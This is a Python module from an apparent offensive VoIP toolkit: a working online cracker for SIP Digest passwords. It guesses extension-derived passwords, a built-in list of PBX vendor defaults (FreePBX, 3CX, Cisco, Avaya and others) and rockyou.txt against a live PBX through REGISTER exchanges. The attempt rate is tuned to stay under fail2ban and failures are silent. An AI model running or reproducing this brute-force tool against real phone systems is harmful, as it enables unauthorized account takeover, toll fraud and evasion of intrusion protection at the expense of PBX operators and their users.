"""SIP Digest credential cracker with rockyou integration.

Attack flow:
  1. Extension-derived candidates (ext==pass, reversals, common variations)
  2. Built-in ~500-entry VoIP password list (admin defaults, common PBX passwords)
  3. rockyou.txt if present — auto-installed via apt if missing (Kali/Debian)

Each candidate is verified *online* via a 2-leg REGISTER exchange:
  REGISTER → 401/407 (fresh nonce) → authenticated REGISTER → 200 OK = CRACK

Only reports on a confirmed 200 OK response.  All failures are silent.
A time-limit (default 45 s) caps the total attack duration.
"""
from __future__ import annotations

import hashlib
import os
import subprocess
import time
from typing import Generator

from . import sip as _sip
from .utils import local_ip_for, rand_call_id, rand_tag

# ---------------------------------------------------------------------------
# Limits
# ---------------------------------------------------------------------------
ONLINE_CAP        = 6_000    # max total password attempts
ATTEMPT_DELAY     = 0.06     # seconds between attempts (≈16/s — avoids fail2ban)
DEFAULT_TIME_LIMIT = 45.0    # wall-clock seconds before giving up

# ---------------------------------------------------------------------------
# Built-in VoIP/SIP high-value password list
# ---------------------------------------------------------------------------
_BUILTIN: list[str] = [
    # ── Numeric commons ─────────────────────────────────────────────────────
    "0000", "1111", "2222", "3333", "4444", "5555",
    "6666", "7777", "8888", "9999",
    "1234", "4321", "12345", "54321",
    "123456", "654321", "1234567890", "0987654321",
    "000000", "111111", "222222", "333333",
    "444444", "555555", "666666", "777777", "888888", "999999",
    "0001", "0002", "0003", "0004", "0005",
    "01234", "012345", "0123456",
    # ── FreePBX / Asterisk defaults ─────────────────────────────────────────
    "admin", "Admin", "ADMIN",
    "admin123", "Admin123", "admin1234", "Admin1234",
    "admin12345", "admin@123", "Admin@123",
    "password", "Password", "PASSWORD",
    "password1", "Password1", "password123", "Password123",
    "asterisk", "Asterisk", "ASTERISK",
    "freepbx", "FreePBX", "FREEPBX",
    "freepbx123", "FreePBX123",
    "sangoma", "Sangoma", "sangoma123",
    "fpbx", "FPBX",
    # ── Grandstream defaults ─────────────────────────────────────────────────
    "admin", "admin123", "grandstream", "Grandstream",
    # ── 3CX defaults ────────────────────────────────────────────────────────
    "Admin1234!", "admin1234!", "3cx", "3CX", "3cx3cx",
    "P@ssword1", "P@ssw0rd", "p@ssword1",
    # ── Cisco / Avaya / Mitel ────────────────────────────────────────────────
    "cisco", "Cisco", "CISCO", "cisco123",
    "avaya", "Avaya", "avaya123",
    "mitel", "Mitel", "mitel123",
    "siemens", "Siemens",
    "alcatel", "Alcatel",
    "nec", "NEC", "nortel", "Nortel",
    "polycom", "Polycom",
    "yealink", "Yealink",
    "snom", "Snom",
    # ── Generic weak ────────────────────────────────────────────────────────
    "voip", "VOIP", "sip", "SIP", "pbx", "PBX",
    "test", "Test", "TEST", "test123", "Test123",
    "demo", "Demo", "demo123",
    "default", "Default", "DEFAULT",
    "guest", "Guest", "guest123",
    "user", "User", "user123", "User123",
    "abc", "ABC", "abc123", "Abc123",
    "qwerty", "Qwerty", "QWERTY", "qwerty123",
    "letmein", "Letmein",
    "welcome", "Welcome", "welcome1",
    "change_me", "changeme", "ChangeMe",
    "pass", "Pass", "PASS",
    "secret", "Secret", "secret123",
    "monkey", "dragon", "master", "sunshine",
    # ── VoIP extension-like ──────────────────────────────────────────────────
    "1000", "1001", "1002", "1003", "1004", "1005",
    "2000", "2001", "3000", "4000", "5000",
    "100", "101", "102", "103", "200", "201",
    "9999", "8888", "7777", "6666",
    # ── Keyboard walks ──────────────────────────────────────────────────────
    "qazwsx", "zxcvbn", "asdfgh", "mnbvcx",
    "!@#$%^", "!@#$%^&",
    # ── Years / dates people use ─────────────────────────────────────────────
    "2020", "2021", "2022", "2023", "2024", "2025",
    "01012020", "01012023", "01012024",
    # ── Trunk / PSTN labels ──────────────────────────────────────────────────
    "trunk", "Trunk", "TRUNK",
    "pstn", "PSTN", "itsp", "ITSP",
    "voiptrunk", "siptrunk",
    # ── Single-char / trivial ────────────────────────────────────────────────
    "1", "0", "a", "x",
]


def _ext_candidates(extension: str) -> list[str]:
    """Extension-derived passwords (ext==pass is the single most common default)."""
    e = extension.lstrip("0") or extension
    return list(dict.fromkeys([  # preserve order, de-duplicate
        extension,
        e,
        extension[::-1],
        e[::-1],
        extension + "1",
        extension + "0",
        extension + "!",
        extension + "0000",
        extension + "9999",
        extension + "1234",
        "1234" + extension,
        extension + extension,
        e + e,
        "0" + extension,
        "00" + extension,
        extension + "@",
        e + "1234",
        "sip" + extension,
        "SIP" + extension,
        extension + "sip",
    ]))


# ---------------------------------------------------------------------------
# rockyou discovery and installation
# ---------------------------------------------------------------------------

_ROCKYOU_PATHS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz",
    "/opt/wordlists/rockyou.txt",
    "/opt/rockyou.txt",
    os.path.expanduser("~/rockyou.txt"),
    os.path.expanduser("~/.local/share/wordlists/rockyou.txt"),
    "/root/rockyou.txt",
    "/home/kali/rockyou.txt",
    "/tmp/rockyou.txt",
]


def find_rockyou() -> str | None:
    """Return path to rockyou.txt (or .gz), None if unavailable."""
    for p in _ROCKYOU_PATHS:
        if os.path.exists(p):
            return p
    return None


def ensure_rockyou(log_fn=None, auto_install: bool = False) -> str | None:
    """Find rockyou, or try to install wordlists package via apt. Returns path or None.

    Set auto_install=True to allow automatic package installation via apt-get.
    Without explicit consent (auto_install=False), apt-get is not run.
    """
    path = find_rockyou()
    if path:
        return path

    def _log(msg: str) -> None:
        if log_fn:
            log_fn(msg)

    if not auto_install:
        _log("rockyou.txt not found — skipping auto-install (pass auto_install=True to enable)")
        return None

    _log("rockyou.txt not found — attempting apt-get install wordlists…")
    try:
        r = subprocess.run(
            ["apt-get", "install", "-y", "--no-install-recommends", "wordlists"],
            capture_output=True, text=True, timeout=120,
        )
        if r.returncode == 0:
            _log("  wordlists package installed.")
        else:
            _log(f"  apt-get failed (rc={r.returncode}) — trying manual download…")
    except Exception:
        _log("  apt-get unavailable.")

    # gunzip if only .gz present
    gz = "/usr/share/wordlists/rockyou.txt.gz"
    plain = "/usr/share/wordlists/rockyou.txt"
    if os.path.exists(gz) and not os.path.exists(plain):
        _log("  gunzip /usr/share/wordlists/rockyou.txt.gz …")
        try:
            subprocess.run(["gunzip", "-k", gz], capture_output=True, timeout=60)
        except Exception:
            pass

    return find_rockyou()


def _rockyou_lines(path: str) -> Generator[str, None, None]:
    """Yield passwords from rockyou.txt or rockyou.txt.gz."""
    if path.endswith(".gz"):
        import gzip
        with gzip.open(path, "rt", encoding="latin-1", errors="replace") as fh:
            for line in fh:
                yield line.rstrip("\r\n")
    else:
        with open(path, "r", encoding="latin-1", errors="replace") as fh:
            for line in fh:
                yield line.rstrip("\r\n")


# ---------------------------------------------------------------------------
# Core verification: 2-leg REGISTER
# ---------------------------------------------------------------------------

def _verify_online(
    host: str,
    extension: str,
    password: str,
    sip_port: int,
    source_ip: str,
    timeout: float,
    tcp: bool = False,
    use_tls: bool = False,
) -> bool:
    """Return True if REGISTER with (extension, password) gets 200 OK from PBX."""
    local_ip = source_ip if source_ip else local_ip_for(host)
    transport = "TLS" if use_tls else ("TCP" if tcp else "UDP")
    uri = f"sip:{host}"
    if sip_port not in (5060, 5061):
        uri = f"sip:{host}:{sip_port}"
    call_id = rand_call_id()
    tag = rand_tag()

    # Leg 1: unauthenticated REGISTER → expect 401/407
    msg1 = _sip.build_message(
        "REGISTER", uri,
        from_user=extension, to_user=extension,
        host=host, port=sip_port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
        extra_headers=["Expires: 30"],
        transport=transport,
    )
    try:
        if tcp:
            data1 = _sip.send_and_recv_tcp(msg1, host, sip_port,
                                            timeout=timeout, use_tls=use_tls)
        else:
            data1 = _sip.send_and_recv(msg1, host, sip_port, 0, timeout)
    except Exception:
        return False

    if not data1:
        return False
    resp1 = _sip.parse_response(data1)
    if not resp1:
        return False

    # Open registration (no auth needed) counts as a hit for the current password attempt
    if resp1.status_code == 200:
        return True

    if not resp1.is_auth_required:
        return False

    params = resp1.auth_params
    if not params:
        return False

    # Leg 2: authenticated REGISTER
    hdr_name = "Proxy-Authorization" if resp1.status_code == 407 else "Authorization"
    try:
        auth_hdr = _sip.build_auth_header(
            extension, password, "REGISTER", uri, params, header_name=hdr_name,
        )
    except ValueError:
        return False

    msg2 = _sip.build_message(
        "REGISTER", uri,
        from_user=extension, to_user=extension,
        host=host, port=sip_port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=2, from_tag=tag,
        extra_headers=["Expires: 30", auth_hdr],
        transport=transport,
    )
    try:
        if tcp:
            data2 = _sip.send_and_recv_tcp(msg2, host, sip_port,
                                            timeout=timeout, use_tls=use_tls)
        else:
            data2 = _sip.send_and_recv(msg2, host, sip_port, 0, timeout)
    except Exception:
        return False

    if not data2:
        return False
    resp2 = _sip.parse_response(data2)
    return bool(resp2 and resp2.status_code == 200)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def crack_sip_digest_challenge(
    challenge: dict,
    extension: str,
    host: str,
    sip_port: int = 5060,
    source_ip: str = "",
    timeout: float = 3.0,
    tcp: bool = False,
    use_tls: bool = False,
    time_limit: float = DEFAULT_TIME_LIMIT,
    log_fn=None,
) -> tuple[str, str] | None:
    """
    Attempt to crack a SIP Digest challenge against the live PBX.

    Returns (password, source_label) on confirmed 200 OK, None otherwise.

    Candidate order:
      1. Extension-derived (ext==pass, reversals, simple variations)
      2. Built-in high-value VoIP password list
      3. rockyou.txt (auto-installed if absent, capped at ONLINE_CAP total)

    All failures are silent; caller only sees a result on confirmed crack.
    """
    # Challenge must have at least a nonce to be usable
    if not challenge.get("nonce") or not challenge.get("realm"):
        return None

    def _log(msg: str) -> None:
        if log_fn:
            log_fn(msg)

    started = time.time()
    attempts = 0

    def _try(pw: str, source: str) -> tuple[str, str] | None:
        nonlocal attempts
        if attempts >= ONLINE_CAP:
            return None
        if time.time() - started > time_limit:
            return None
        attempts += 1
        time.sleep(ATTEMPT_DELAY)
        if _verify_online(host, extension, pw, sip_port, source_ip, timeout, tcp, use_tls):
            return (pw, source)
        return None

    # Phase 1: extension-derived candidates
    for pw in _ext_candidates(extension):
        if pw:
            result = _try(pw, "extension-derived")
            if result:
                _log(f"  [CRACK] ext-derived: {pw}")
                return result

    # Phase 2: built-in VoIP list
    for pw in _BUILTIN:
        if pw:
            result = _try(pw, "built-in VoIP list")
            if result:
                _log(f"  [CRACK] built-in: {pw}")
                return result

    if time.time() - started > time_limit:
        _log(f"  [CRACK] time limit ({time_limit:.0f}s) reached after {attempts} attempts.")
        return None

    # Phase 3: rockyou
    rockyou_path = ensure_rockyou(log_fn=_log)
    if not rockyou_path:
        _log("  [CRACK] rockyou unavailable — cracking stopped after built-in list.")
        return None

    _log(f"  [CRACK] rockyou loaded from {rockyou_path} — continuing…")
    for pw in _rockyou_lines(rockyou_path):
        if not pw or len(pw) > 64:
            continue
        result = _try(pw, f"rockyou ({rockyou_path})")
        if result:
            _log(f"  [CRACK] rockyou hit: {pw}")
            return result
        if attempts >= ONLINE_CAP or time.time() - started > time_limit:
            break

    _log(f"  [CRACK] exhausted {attempts} candidates — no match found.")
    return None
